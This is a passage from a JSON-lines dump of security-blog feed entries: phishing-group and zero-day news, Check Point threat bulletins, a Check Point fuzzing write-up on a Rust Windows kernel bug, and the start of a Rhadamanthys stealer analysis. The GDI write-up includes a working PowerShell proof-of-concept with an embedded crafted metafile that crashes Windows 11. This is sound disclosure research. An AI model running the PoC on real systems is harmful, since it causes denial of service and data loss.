organizations in the fields of travel, hospitality, and related industries. Those organizations tend to be located in Latin America, and sometimes in North America or Western Europe.\nThroughout their history, TA558 has used socially engineered emails to lure victims into clicking on malicious links or documents. Those emails – most often written in Portuguese or Spanish – usually purported to concern hotel reservations. The subject line, or the name of the attached document, was often, simply, “reserva.”\nIn their early exploits, the group would leverage vulnerabilities in Microsoft Word’s Equation Editor – for example, CVE-2017-11882, a remote code execution bug. The goal was to download a RAT – most commonly Loda or Revenge RAT – to the target machine.\nIn 2019 the group expanded its arsenal, with malicious macro-laced Powerpoint attachments and template injections against Office documents. They also expanded to new demographics, utilizing English-language phishing lures for the first time.\nEarly 2020 was TA558’s most prolific period, as they churned out 25 malicious campaigns in January alone. They predominantly used macro-laden Office documents, or targeted known Office vulnerabilities during this period.\n“Organizations, especially those operating in targeted sectors in Latin America, North America, and Western Europe should be aware of this actor’s tactics, techniques, and procedures,” researchers advise.", "timestamp": "2025-10-21T13:35:51.552873"}
{"source": "blog", "feed": "https://threatpost.com/feed/", "title": "iPhone Users Urged to Update to Patch 2 Zero-Days", "url": "https://threatpost.com/iphone-users-urged-to-update-to-patch-2-zero-days-under-attack/180448/", "published": "Fri, 19 Aug 2022 15:25:56 +0000", "content": "Apple is urging macOS, iPhone and iPad users immediately to install respective updates this week that includes fixes for two zero-days under active attack. The patches are for vulnerabilities that allow attackers to execute arbitrary code and ultimately take over devices.\nPatches are available for effected devices running iOS 15.6.1 and macOS Monterey 12.5.1. Patches address two flaws, which basically impact any Apple device that can run either iOS 15 or the Monterey version of its desktop OS, according to security updates released by Apple Wednesday.\nOne of the flaws is a kernel bug (CVE-2022-32894), which is present both in iOS and macOS. According to Apple it is an “out-of-bounds write issue [that] was addressed with improved bounds checking.”\nThe vulnerability allows an application to execute arbitrary code with kernel privileges, according to Apple, which, in usual vague fashion, said there is a report that it “may have been actively exploited.”\nThe second flaw is identified as a WebKit bug (tracked as CVE-2022-32893), which is an out-of-bounds write issue that Apple addressed with improved bounds checking. The flaw allows for processing maliciously crafted web content that can lead to code execution, and also has been reported to be under active exploit, according to Apple. WebKit is the browser engine that powers Safari and all other third-party browsers that work on iOS.\nPegasus-Like Scenario\nThe discovery of both flaws, about which little more beyond Apple’s disclosure are known, was credited to an anonymous researcher.\nOne expert expressed worry that the latest Apple flaws “could effectively give attackers full access to device,” they might create a Pegasus-like scenario similar to the one in which nation-state APTs barraged targets with spyware made by Israeli NSO Group by exploiting an iPhone vulnerability.\n“For most folks: update software by end of day,” tweeted Rachel Tobac, the CEO of SocialProof Security, regarding the zero-days. “If threat model is elevated (journalist, activist, targeted by nation states, etc): update now,” Tobac warned.\nZero-Days Abound\nThe flaws were unveiled alongside other news from Google this week that it was patching its fifth zero-day so far this year for its Chrome browser, an arbitrary code execution bug under active attack.\nThe news of yet more vulnerabilities from top tech vendors being barraged by threat actors demonstrates that despite the best efforts from top-tier tech companies to address perennial security issues in their software, it remains an uphill battle, noted Andrew Whaley, senior technical director at Promon, a Norwegian app security company.\nThe flaws in iOS are especially worrying, given the ubiquity of iPhones and users’ utter reliance on mobile devices for their daily lives, he said. However, the onus is not only on vendors to protect these devices but also for users to be more aware of existing threats, Whaley observed.\n“While we all rely on our mobile devices, they are not invulnerable, and as users we need to maintain our guard just like we do on desktop operating systems,” he said in an email to Threatpost.\nAt the same time, developers of apps for iPhones and other mobile devices also should add an extra layer of security controls in their technology so they are less reliant on OS security for protection, given the flaws that frequently crop up, Whaley observed.\n“Our experience shows that this is not happening enough, potentially leaving banking and other customers vulnerable,” he said.", "timestamp": "2025-10-21T13:35:52.351781"}
{"source": "blog", "feed": "https://threatpost.com/feed/", "title": "Google Patches Chrome’s Fifth Zero-Day of the Year", "url": "https://threatpost.com/google-patches-chromes-fifth-zero-day-of-the-year/180432/", "published": "Thu, 18 Aug 2022 14:31:38 +0000", "content": "Google has patched the fifth actively exploited zero-day vulnerability discovered in Chrome this year as one in a series of fixes included in a stable channel update released Wednesday.\nThe bug, tracked as CVE-2022-2856 and rated as high on the Common Vulnerability Scoring System (CVSS), is associated with “insufficient validation of untrusted input in Intents,” according to the advisory posted by Google.\nGoogle credits Ashley Shen and Christian Resell of its Google Threat Analysis Group (TAG) for reporting the zero-day bug, which could allow for arbitrary code execution, on July 19. The advisory also unveiled 10 other patches for various other Chrome issues.\nIntents are a deep linking feature on the Android device within the Chrome browser that replaced URI schemes, which previously handled this process, according to Branch, a company that offers various linking options for mobile applications.\n“Instead of assigning window.location or an iframe.src to the URI scheme, in Chrome, developers need to use their intent string as defined in this document,” the company explained on its website. Intent “adds complexity” but “automatically handles the case of the mobile app not being installed” within links, according to the post.\nInsufficient validation is associated with input validation, a frequently-used technique for checking potentially dangerous inputs to ensure that they are safe for processing within the code, or when communicating with other components, according to MITRE’s Common Weakness Enumeration site.\n“When software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application,” according to a post on the site. “This will lead to parts of the system receiving unintended input, which may result in altered control flow, arbitrary control of a resource, or arbitrary code execution.”\nFending Off Exploits\nAs is typical, Google did not disclose specific details of the bug until it is widely patched to avoid threat actors taking further advantage of it, a strategy that one security professional noted is a wise one.\n“Publicizing details on an actively exploited zero-day vulnerability just as a patch becomes available could have dire consequences, because it takes time to roll out security updates to vulnerable systems and attackers are champing at the bit to exploit these types of flaws,” observed Satnam Narang, senior staff research engineer at cybersecurity firm Tenable, in an email to Threatpost.\nHolding back info is also sound given that other Linux distributions and browsers, such as Microsoft Edge, also include code based on Google’s Chromium Project. These all could be affected if an exploit for a vulnerability is released, he said.\n“It is extremely valuable for defenders to have that buffer,” Narang added.\nWhile the majority of the fixes in the update are for vulnerabilities rated as high or medium risk, Google did patch a critical bug tracked as CVE-2022-2852, a use-after-free issue in FedCM reported by Sergei Glazunov of Google Project Zero on Aug. 8. FedCM—short for the Federated Credential Management API–provides a use-case-specific abstraction for federated identity flows on the web, according to Google.\nFifth Chrome 0Day Patch So Far\nThe zero-day patch is the fifth Chrome bug under active attack that Google has patched so far this year.\nIn July, the company fixed an actively exploited heap buffer overflow flaw tracked as CVE-2022-2294 in WebRTC, the engine that gives Chrome its real-time communications capability, while in May it was a separate buffer overflow flaw tracked as CVE-2022-2294 and under active attack that got slapped with a patch.\nIn April, Google patched CVE-2022-1364, a type confusion flaw affecting Chrome’s use of the V8 JavaScript engine on which attackers already had pounced. The previous month a separate type-confusion issue in V8 tracked as CVE-2022-1096 and under active attack also spurred a hasty patch.\nFebruary saw a fix for the first of this year’s Chrome zero-days, a use-after-free flaw in Chrome’s Animation component tracked as CVE-2022-0609 that already was under attack. Later it was revealed that North Korean hackers were exploiting the flaw weeks before it was discovered and patched.", "timestamp": "2025-10-21T13:35:53.163948"}
{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "20th October – Threat Intelligence Report", "url": "https://research.checkpoint.com/2025/20th-october-threat-intelligence-report/", "published": "Mon, 20 Oct 2025 13:24:08 +0000", "content": "For the latest discoveries in cyber research for the week of 20th October, please download our Threat Intelligence Bulletin.\nTOP ATTACKS AND BREACHES\nCheck Point IPS provides protection against this threat (Oracle Concurrent Processing Remote Code Execution)\nCheck Point Threat Emulation and Harmony Endpoint provide protection against this threat (Ransomware.Win.Play; Ransomware.Wins.PLAY)\nVULNERABILITIES AND PATCHES\nCheck point IPS blade provides protection against these threats ((Microsoft Windows Remote Access Connection Manager Privilege Escalation (CVE-2025-59230), Agere Modem Driver Privilege Escalation (CVE-2025-24990)\nMicrosoft Windows Server Update Service Remote Code Execution (CVE-2025-59287))\nTHREAT INTELLIGENCE REPORTS", "timestamp": "2025-10-21T13:35:55.314779"}
{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "Denial of Fuzzing: Rust in the Windows kernel", "url": "https://research.checkpoint.com/2025/denial-of-fuzzing-rust-in-the-windows-kernel/", "published": "Thu, 16 Oct 2025 14:17:15 +0000", "content": "Check Point Research (CPR) identified a security vulnerability in January 2025 affecting the new Rust-based kernel component of the Graphics Device Interface (commonly known as GDI\n) in Windows. We promptly reported this issue to Microsoft and they fixed the vulnerability starting with OS Build 26100.4202 in the KB5058499 update preview released on May 28th 2025. In the following sections, we detail the methodology of our fuzzing campaign, which targeted the Windows graphics component via metafiles and led to the discovery of this security vulnerability, among others, whose technical analysis is published separately in Drawn to Danger: Bugs in Windows Graphics Lead to Remote Code Execution and Memory Exposure.\nFuzzing, a widely used software testing technique, involves providing invalid, unexpected, or random data as inputs to the program being tested for the purpose of identifying bugs. Fuzzing is a key part of our proactive approach to security testing, and we regularly apply fuzzing to widely used systems, such as Microsoft’s Windows operating system, to identify and address potential vulnerabilities before they can be exploited by malicious actors.\nA reliable testing environment is essential for this kind of work. WinAFL\nis a highly capable fuzzer, known for its role in identifying numerous publicly acknowledged vulnerabilities over the years, and was specifically adapted to target Windows binaries. To conduct mid-scale fuzz testing efficiently, we need to use a management tool like WinAFL Pet\n. These tools simplify the creation, configuration and monitoring of fuzzing jobs, while streamlining the evaluation of any crashes detected in the application. As running multiple fuzzer instances over several days – or even weeks – can result in numerous crashes, it is important to promptly analyze what caused the program failures. BugId\nprovides a comprehensive and rapid analysis of the underlying reasons behind a program’s crash.\nGDI\nis a well-known core component of the Windows operating system, offering two-dimensional vector graphics, imaging, and typography. It enhances the Graphics Device Interface found in earlier versions of Windows by introducing new features and optimizing existing ones.\nThe Enhanced Metafile Format (EMF\n) containing instructions to call GDI\nfunctions. The Enhanced Metafile Format Plus (EMF+\n) is a variant of EMF\nmetafiles where EMF+\nrecords are embedded within EMF\nrecords. This embedding is made possible by the ability of EMF\nto include arbitrary private data in an EMR_COMMENT_EMFPLUS\nrecord. Additionally, multiple EMF+\nrecords can be embedded in a single EMF\nrecord, as illustrated by Figure 1.\nFigure 1. Metafiles with embedded EMF+ records (Source: Microsoft).\nEMF\nfiles represent a significant attack surface. Because of their compact file size, these files are particularly suitable for fuzz testing. Although EMF\nfiles were the focus of multiple vulnerability disclosures in the past, the transition to the EMF+\nformat is less extensively studied and analyzed. The EMF+\nformat introduced a variety of new metafile records, increasing the complexity of processing these files. Therefore, in our current research, we focus on the long-standing attack surface of the GDI\nsubsystem related to the handling of metafiles and build on prior research on the EMF\nformat.\nWe launched a fuzzing campaign with a corpus of only 16 initial seed files, including several samples based on the EMF+\nformat. Within only a few days of testing, the fuzzer identified several potential security vulnerabilities whose possible impacts range from information disclosure to arbitrary code execution. During the fuzzing campaign, we encountered a recurring system crash – which we call a Denial of Fuzzing condition – that disrupted our research and led to an unexpected discovery. After a week of testing, the test system crashed and restarted due to a BugCheck\n. This suggested that the fuzzer came across a bug affecting the Windows kernel. Given that our main focus was on user-space fuzzing, there was no straightforward method available to reproduce the crash in this scenario. Nevertheless, restarting the test campaign led to the same outcome: the system crashed again after a few days of testing, confirming the presence of a bug in the Windows kernel triggered by extensive mutations of the initial seed corpus.\nThis led to a shift in our focus from discovering additional vulnerabilities to tracking down this specific bug in the Windows kernel and reproducing the crash consistently. To achieve this, our first step was to enable capturing the memory dumps so we could analyze the state of the operating system at the time of the crash. However, because we used a RAM disk for file storage and the fuzzer instances were running in shared-memory mode (enabled with the -s\noption in WinAFL\n) to improve testing speed, determining which sample was being processed at the time of the crash remained a challenge, like trying to find a needle in a haystack. Restarting the fuzzing campaign confirmed that the system crash consistently occurred after a few days of testing and allowed us to gather multiple memory snapshots to analyze the mutated samples processed by the crashing fuzzer instance.\nAn initial attempt to locate the potential culprit in the memory dump by searching for EMF\nsignatures did not yield the desired outcome, as running each potential sample through the testing harness failed to reproduce the crash. To address this, we explored the possibility of extracting files from the queue\nfolder of the crashing fuzzer instance using the complete memory dump. One potential solution was to use Volatility\n, the well-known memory forensics tool, capable of identifying files with the FileScan\nmodule and extracting them using the DumpFiles\nmodule. However, this method proved less suitable for efficiently saving a large volume of files automatically.\nThe forensic\nmode of the MemProcFS\ntool can automatically identify files within a complete memory dump. Because a RAM disk was used during testing, we obtained a complete snapshot of the actual state of the fuzzer at the moment of the system crash. Our next goal was to reduce the time window required to reproduce the error. We achieved this by initiating new fuzzing campaigns with seed files derived from the samples extracted from the queue\nfolder of the crashing fuzzer instance. These new test campaigns reached the mutation phase more quickly, resulting in the system crash occurring sooner.\nDespite the progress, we were still unable to reproduce the error at will. Eventually, we achieved a setup where a single fuzzer instance could trigger the mutation causing the error within 30 minutes, using a data set of 836 files. This advancement allowed us to modify our fuzzing harness to transmit the mutated test files to a remote server over the network. The primary goal of this approach was to have minimal impact on the fuzzer and ensure it did not negatively affect performance or stability. To accomplish this, we supplemented the harness with the following send_data()\nfunction, designed to transmit each tested sample to a remote server. After establishing the connection, the function sends the size of the data followed by the actual data, handling any potential errors at each step by cleaning up and returning an error code if necessary.\nint send_data(char* data, uint32_t size) { WSADATA wsa; SOCKET s; struct sockaddr_in server; wchar_t ip_address[] = L\"192.168.1.1\"; server.sin_family = AF_INET; server.sin_port = htons(4444); if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return 1; } if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) { WSACleanup(); return 1; } if (InetPton(AF_INET, ip_address, &(server.sin_addr)) != 1) { closesocket(s); WSACleanup(); return 1; } if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) { closesocket(s); WSACleanup(); return 1; } uint32_t size_header = htonl(size); if (send(s, (char*)&size_header, sizeof(size_header), 0) < 0) { closesocket(s); WSACleanup(); return 1; } if (send(s, data, size, 0) < 0) { closesocket(s); WSACleanup(); return 1; } closesocket(s); WSACleanup(); return 0; }\nListing 1. Client-side modification to send every mutation to the server.\nOn the server side, the following Python script actively listens for incoming connections. Each connection is handled in a separate thread, where the script receives samples from the fuzzing harness and saves them as individual files. After 5,000\nfiles are collected, the script compresses them into a ZIP\narchive and deletes the original files to optimize storage usage.\n#!/usr/bin/env python3 import os import socket import zipfile import threading from concurrent.futures import ThreadPoolExecutor file_counter = 0 file_counter_lock = threading.Lock() zip_counter = 1 def handle_client(client_socket, address): global file_counter, zip_counter data_size = int.from_bytes(client_socket.recv(4), byteorder='big') data = bytearray() while len(data) < data_size: packet = client_socket.recv(min(1024, data_size - len(data))) if not packet: break data.extend(packet) with file_counter_lock: file_counter += 1 file_name = f\"id_{file_counter:06d}\" print(f\"Received {file_counter}\") with open(file_name, \"wb\") as file: file.write(data) if file_counter % 5000 == 0: zip_name = f\"archive_{zip_counter:03d}.zip\" with zipfile.ZipFile(zip_name, 'w') as zipf: for i in range(file_counter - 4999, file_counter + 1): zipf.write(f\"id_{i:06d}\") os.remove(f\"id_{i:06d}\") zip_counter += 1 client_socket.close() def main(): server_ip = \"0.0.0.0\" server_port = 4444 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((server_ip, server_port)) server.listen(5) print(\"[*] Waiting for incoming connections...\") with ThreadPoolExecutor(max_workers=20) as executor: while True: client_socket, addr = server.accept() executor.submit(handle_client, client_socket, addr) if __name__ == \"__main__\": main()\nListing 2. Server-side Python script to catch mutated samples sent by the harness.\nThis modification allowed us to reproduce the error, even if it resulted from processing multiple different test files. During the first test run after updating the fuzzing harness, the system successfully crashed after 30\nminutes. Based on the sample files logged on the server, the campaign reached the mutation responsible for generating the file that caused the crash after an impressive 380,000\nmutations. The technical analysis of the vulnerability is outlined in the following sections.\nWe found a crash via a system service exception that occurred during the execution of a NtGdiSelectClipPath\nsyscall within version 10.0.26100.3037\nof the win32kbase_rs.sys\ndriver. The stack trace from this crash shows Microsoft’s efforts to enhance security by reimplementing the REGION\ndata type of the GDI\nsubsystem using Rust in the Windows kernel, as discussed by a presentation on Default Security at the BlueHat IL 2023 conference. This transition is evident in how the Win32kRS::RegionCore_set_from_path()\nfunction within the win32kbase.sys\ndriver calls a function with the same name in the new win32kbase_rs.sys\ndriver. Notably, the system crash was triggered by this new kernel component designed to improve security, as suggested by the name of the panic_bounds_check()\nfunction referenced in the stack trace shown in Figure 2.\nAccording to the decompiled source code of the vulnerable version of the win32kbase_rs.sys\nkernel driver, the system crashes when the v109\nindex exceeds the allowed v86\nrange as shown in Figure 3, triggering a kernel panic. This issue is likely caused by the v88\nand v95\nloop variables incrementing beyond valid limits without proper safeguards.\nFigure 3. Decompiled source code of the region_from_path_mut()\nfunction.\nWhen the region_from_path_mut()\nfunction converts a path into a region it represents the outline as a singly linked list of edge blocks. The program detects the out-of-bounds memory access via core::panicking::panic_bounds_check()\nand triggers a SYSTEM_SERVICE_EXCEPTION\n.\nThe first metafile record in the crash sample that drives the execution flow into the region_from_path_mut()\nfunction is the EmfPlusDrawBeziers\nrecord. The path geometry resulting from this record produces the specific edge blocks responsible for the memory corruption. When the system plays this record, the geometric pen specified in the EmfPlusObject\nrecord makes the stroke wide. The malformed‐path data eventually causes the out-of-bounds condition when the path is widened, flattened, and converted to a region in the kernel.\nThe following is the relevant excerpt of the EmfPlusObject\nthat specifies the pen to use. If PenDataStartCap\nis set, the style of a starting line cap is specified in the OptionalData\nfield of an EmfPlusPenData\nobject. Similarly, PenDataNonCenter\nindicates whether a pen alignment is specified in the OptionalData\nfield of an EmfPlusPenData\nobject.\nEmfPlusObject pen = { .Type = 0x4008, // EmfPlusObject .Flags = 0x0200, // EmfPlusPen .Size = 0x00000030, .DazaSize = 0x00000024, .ObjectData = { .Version = 0xDBC01002, // EMF+ .Type = 0x42200000, // PenDataNonCenter, PenDataStartCap .PenDataFlags = 0x00000202, // UnitTypeInch .PenUnit = 0x00000004, .PenWidth = 0xFFFFFFEE, .OptionalData = { .StartCap = 0x0000FC05, .PenAlignment = 0x0051E541 } } };\nListing 3. Metafile record defining a Pen object.\nThe following structure shows the EmfPlusDrawBeziers\nrecord that triggered the vulnerability. It contains values produced through mutation, including 17 points, despite declaring a nominal count of only 4, which is ignored during processing. This mismatch, along with the coordinate data, appears sufficient to stress the path parsing logic and expose this edge-case behavior in the kernel.\nEmfPlusDrawBeziers beziers = { .Type = 0x4019, .Flags = 0x00D6, // C=1, P=0, ObjectID=0x36 .Size = 0x00000050, // 80 bytes .DataSize = 0x00000044, // 68 bytes .Count = 0x00000004, // nominal count (ignored) // PointData is read as EmfPlusPoint objects with absolute coordinates. .PointData[17] = { { 0xE63D, 0x0000 }, // (-6595 , 0) { 0xFC05, 0x0000 }, // (-1019 , 0) { 0xE541, 0x0051 }, // (-6847 , 81) { 0x0049, 0x7FFF }, // ( 73 , 32767) { 0x004C, 0x1400 }, // ( 76 , 5120) { 0x4008, 0x0202 }, // (16392 , 514) { 0x0067, 0x0000 }, // ( 103 , 0) { 0x1002, 0xDBC0 }, // ( 4098 , -9280) { 0x001C, 0x0000 }, // ( 28 , 0) { 0x0010, 0x0000 }, // ( 16 , 0) { 0x1002, 0xDBC0 }, // ( 4098 , -9280) { 0x0001, 0x0000 }, // ( 1 , 0) { 0x0060, 0x4008 }, // ( 96 , 16392) { 0x0003, 0x0000 }, // ( 3 , 0) { 0x0000, 0x4600 }, // ( 0 , 17920) { 0x0000, 0x0100 }, // ( 0 , 256) { 0x004C, 0x0000 } // ( 76 , 0) } };\nListing 4. Metafile record defining a Bezier curve with 17 absolute points.\nAdditional analysis indicates that the bounds check fails specifically when a Metafile\nobject is passed to Graphics::FromImage()\nto create a Graphics\nobject, despite the method being documented to accept only Image\nobjects intended for drawing, such as Bitmap\n. This misuse enables execution to reach the vulnerable code path. The resulting BugCheck\ncan be triggered by invoking the DrawImage()\nmethod on the Graphics\nobject created from the Metafile\n. The following PowerShell script embeds a metafile in the $b\nvariable containing a specially crafted EmfPlusDrawBeziers\nrecord with malformed edge data. This approach works from low integrity within a standard user session and affects both x86 and x64 systems, as the vulnerable routine resides in the win32kbase_rs.sys\ndriver.\nAdd-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $b = [Convert]::FromBase64String(\"AQAAAGwAAAAAAAAAACEAAGMAAABgCAAAlQEAAAAAAABvCfMAIAoAACBFTUYAAAEAYAIAAAkAAAABAAAAAAAAAAAAAAAAAAAAgAcAALAEAADYAgAARAH6AAAAAAAAAAAAAAAAAHDnBwCg8QQARgAAACwAAAAAEAAARU1GKwFAAAAcAAAAEAAAAAIQwNsBAAAAYAAAAGAAAABGAAAAFAEAAAgBAABFTUYrCEAAAjAAAAAkAAAAAhDA2wAAIEICAgAABAAAAO7///8F/AAAQeVRAEkAQQBMAAAACEAAAkgAAAA8AAAAAhDA2wAA5f/wAAAALAAAAP///vBGTUor4EAAEAAAAIAQAAAAAhDA2wEAAABgAAhAAwAAAAAAf38SQAAACEACATwAAAAwAAAAuxDA2wQAAAAAAAAAAAAAEAABAADlAAAAAADuQgAAyEIAHgAA/wAA/wAA////AAD/GUAA1lAAAABEAAAABAAAAD3mAAAF/AAAQeVRAEkA/39MAAAUCEACAmcAAAACEMDbHAAAABAAAAACEMDbAQAAAGAACEADAAAAAAAARgAAAAEAAABMAAAAZAAAAAAPAAAAAAwAABAAAABgAAAAD+j///8AAABVEQAAyEIAAMhCAAD///7/7/8AAP/9/wDi/mEAAAApAKoAFgAAAAAAogAAAIA/AAAAAAAAAAAAABAAAPD///8AAAAAAAAAdXV1dXV1dXV1dQD29gAiAAAADAAAAP////9GAAoAAAAAAA4AAABFTUYrGUAA/gsKAAAAAH+ADgAAABQAAAAAAAAAEAASABQNAAA=\"); $s = [System.IO.MemoryStream]::new($b); $f = New-Object System.Windows.Forms.Form; $g = [System.Drawing.Graphics]::FromHwnd($f.Handle); $h = $g.GetHdc(); $m = New-Object System.Drawing.Imaging.Metafile($s, $h); $mg = [System.Drawing.Graphics]::FromImage($m); $mg.DrawImage([System.Drawing.Image]::FromStream($s),0,0);\nListing 5. Proof-of-concept PowerShell script for reproducing the vulnerability.\nThe shown proof-of-concept metafile can only trigger the crash when the edge block reaching the kernel produces a specific path geometry. Below are three independent record-level edits that would prevent that layout from forming, so the buggy code path is not executed:\nC/P\nflags so the PointData\nfield is read as an array of EmfPlusPointF\nobjects:$b[0x15f]=0;\nSize\nto add an extra flat point:$b[0x160]=84;$b=$b[0..351]+(0,0,0,0)+$b[352..($b.Length-1)];\nDataSize\nto 64\nto drop the last point:$b[0x164]=64;\nThis issue is mitigated by the fact that the vulnerable win32kbase_rs.sys\ncomponent is not present on Windows Server versions. We reported this vulnerability to Microsoft, but MSRC classified it as Moderate severity, stating that it does not warrant immediate servicing. However, they fixed the vulnerability as part of a feature update few weeks after the May 2025 Patch Tuesday. According to their assessment:\n“the Rust code correctly catches an out-of-bounds array access and triggers a panic, resulting in a Blue Screen of Death (BSOD), as expected”\nHowever, the observed behavior aligns with the broader definition of a vulnerability. Triggering a BSOD through a user-space function that processes user-controlled input should be regarded as a vulnerability necessitating a security fix. A failed security check should not lead to a system crash.\nMore importantly, as confirmed by the MSRC, a threat actor could exploit this flaw by creating malicious metafiles designed to crash targeted systems when the metafile is displayed. Such disruptions could render enterprise environments temporarily inoperable, leading to unexpected downtime and interfering with key business processes. In addition, there may be data loss or corruption as well.\nImagine a scenario where an attacker obtains credentials for a low-privileged domain user who can log in to all systems across the entire enterprise. With a bit of scripting magic, they could easily crash every Windows desktop late on a Friday afternoon, early Monday morning or at a chosen time that would be most detrimental to the business.\nMicrosoft determined that this was a moderate-severity denial-of-service issue and therefore chose to address it in a non-security update. According to Microsoft, the fix was first shipped with KB5058499 in version 10.0.26100.4202 of the win32kbase_rs.sys\nkernel module, released on May 28, 2025, and reached full global release status by the end of the week of June 23. Notably, version 4202 introduced a significant update to the module, reflected in a file size increase from 148 KB to 164 KB, suggesting substantial internal changes likely related to the vulnerability fix. One of the most heavily modified components in this update is the region_from_path_mut()\nfunction, which underwent some restructuring.\nFigure 5. Visualization of function-level differences showing modifications in the region_from_path_mut()\nfunction.\nAmong its most notable changes is the introduction of two distinct edge-handling routines: add_edge_original()\nand add_edge_new()\n. The GlobalEdgeTable::add_edge()\nfunction, which converts two vertices into an edge record and inserts it into the in-memory edge table, now exists in these two forms. Microsoft retained the original logic as add_edge_original()\nand implemented a new, bounds-hardened version called add_edge_new()\n. While both implementations produce the same functional output, the new version addresses several corner cases and potential memory-handling issues present in the legacy routine.\nFigure 6. Decompiled source code of the region_from_path_mut()\nfunction showing the add_edge_new()\nfunction.\nA feature flag, Feature_Servicing_Win32kRSPathToRegion_IsEnabled()\n, determines at runtime which version is invoked. Although the fix was already present in the codebase, we found during our initial testing that this feature flag was disabled. We were only able to confirm the presence of the fix in the debugger, and we could only verify the fix later in production following the July 2025 Patch Tuesday.\nWe discovered a security vulnerability in the recently shipped Rust code of the Windows graphics component that could have serious implications for system security. While the adoption of Rust in the Windows kernel marks a significant step forward for security and reliability, it is important to recognize that software engineering challenges cannot be overcome by language choice alone. Rust offers strong guarantees around memory safety and type correctness, helping prevent entire classes of bugs such as buffer overflows and invalid pointer dereferences. However, rigorous security testing and thoughtful software design remain essential, as issues can still arise.\nIn the case of implementing GDI region and related functions in Rust, a failed security check triggered a deliberate kernel panic, also known as Blue Screen of Death (BSOD). Although this crash was originally intended as a safety mechanism, for example, as an emergency stop when something goes wrong, this highlights a larger concern. A fitting analogy might be a home alarm system that stops a burglar by blowing up the house. While the threat is technically neutralized, the collateral damage is far too costly.\nWe should aim for security solutions that protect without risking system-wide failure. It is also worth bearing in mind that these issues are not unique to Rust but can happen in any other software project as well. Therefore, while it is encouraging to see this step to rewrite a critical part of the operating system using memory-safe language, this example must also serve as a reminder of the difficulties involved and the necessity of using extremely thorough engineering standards and principles. Even rigorous standards will not guarantee smooth sailing. We should still anticipate encountering unexpected bugs and vulnerabilities.\nOur finding may constitute the first publicly disclosed security issue involving a Rust-based kernel component following Rust’s integration into the Windows kernel. Shortly thereafter, we identified a vulnerability that could allow attackers to crash Windows 11 version 24H2 using a specially crafted metafile, as demonstrated by a one-liner proof-of-concept PowerShell script. The question remains whether we will continue to see more bugs like this in the kernel.", "timestamp": "2025-10-21T13:35:55.956065"}
{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "13th October – Threat Intelligence Report", "url": "https://research.checkpoint.com/2025/13th-october-threat-intelligence-report/", "published": "Mon, 13 Oct 2025 08:53:28 +0000", "content": "For the latest discoveries in cyber research for the week of 13th October, please download our Threat Intelligence Bulletin.\nTOP ATTACKS AND BREACHES\nCheck Point Threat Emulation provides protection against this threat (Ransomware.Wins.Qilin)\nVULNERABILITIES AND PATCHES\nCheck Point IPS provides protection against this threat (TP-Link Archer AX21 Command Injection (CVE-2023-1389); TBK DVR Devices Command Injection (CVE-2024-3721); Four-Faith F3x Series Command Injection (CVE-2024-12856))\nCheck Point IPS provides protection against this threat (Oracle Concurrent Processing Remote Code Execution (CVE-2025-61882))\nCheck Point IPS provides protection against this threat (Redis Use After Free (CVE-2025-49844))\nTHREAT INTELLIGENCE REPORTS\nCheck Point Threat Emulation and Harmony Endpoint provide protection against this threat (Worm.Wins.Xworm; RAT.Wins.XWorm.ta.*)", "timestamp": "2025-10-21T13:35:56.579664"}
{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "Rhadamanthys 0.9.x – walk through the updates", "url": "https://research.checkpoint.com/2025/rhadamanthys-0-9-x-walk-through-the-updates/", "published": "Wed, 01 Oct 2025 08:32:37 +0000", "content": "Research by: hasherezade\nRhadamanthys is a complex, multi-modular malware sold on the underground market since September 2022. It was first advertised by the actor “kingcrete2022.” From the outset, its design showed the hallmarks of experienced developers, and analysis soon revealed that it drew heavily from an earlier project by the same authors, Hidden Bee [1]. This strong foundation helped Rhadamanthys quickly gain traction: from a niche product, it grew into one of the dominant stealers in cybercrime campaigns and has even attracted interest from more advanced threat actors.\nSince its appearance, Check Point Research (CPR) has been closely tracking its development, noting constant updates and customization options. In previous publications, we explored the breadth of its features, internal design, and the execution flow of its components using v0.5 as an example. Much of that work remains relevant today, as the core architecture has stayed intact.\nHowever, with the release of v0.9.x, Rhadamanthys introduced changes that broke some of our previously published tools, including the custom format converter and string deobfuscator. This was a clear sign that the family had reached another milestone update, one significant enough to warrant a fresh analysis. In this blog, we present our findings on the latest release, v0.9.2.\nIt is worth noting that the initial loader of Rhadamanthys comes in multiple variants: it can be a .NET executable or a native Windows executable (32- or 64-bit). The main target of our analysis is the execution chain started by the native version. Although the first stage varies, the later stages are identical for all loader types.\nRhadamanthys was initially promoted through posts on cybercrime forums, but soon it became clear that the author had a more ambitious plan to connect with potential customers and build visibility. In parallel, they launched a Telegram support channel, a Tor website with detailed product descriptions, and offered communication via Tox. Most recently, the website underwent a complete makeover, presenting a polished and professional image. The operators now brand themselves as “RHAD security” and “Mythical Origin Labs.”\nThe new site showcases all of their products, including teasers for those still in development. Alongside Rhadamanthys – their flagship stealer – they also advertise Elysium Proxy Bot and a Crypt Service. Version updates are also listed, though this section is not always up to date with actual releases.\nAs before, Rhadamanthys is offered in tiered packages: from $299 per month for a self-hosted version, to $499 per month with a rented server and additional benefits. A special Enterprise tier, with individually negotiated pricing, is also available.\nThe combination of the branding, product portfolio, and pricing structure suggest that the authors treat Rhadamanthys as a long-term business venture rather than a side project.\nFor defenders, this professionalization signals that Rhadamanthys with its growing customer base and an expanding ecosystem is likely here to stay, making it important to track not only its malware updates but also the business infrastructure that sustains it.\nThe release of version 0.9 was announced in February 2025, followed by subsequent updates 0.9.1 and 0.9.2. The official website, however, still lists only 0.9.1 (released in May). Its changelog includes a long list of updates, reproduced below:\nv0.9.1 (2025-05-18) - Redesigned database operation process, separated read and write operations. Ensures data write integrity - User management permission levels, introduced new worker, traffic merchant, removed observer mode - Optimized file packaging and CPU usage when exporting to directory. Significantly reduced log packaging export speed - TOR removed random address generation, fixed address permanently effective - Management login added 2FA OTP login verification - Client and task plugins, introduced memory mutex throughout the process, suppressing multiple executions on the same machine sending duplicate data - Client loading introduced tracking system, can interface with user's loading program. Program startup and data collection work will 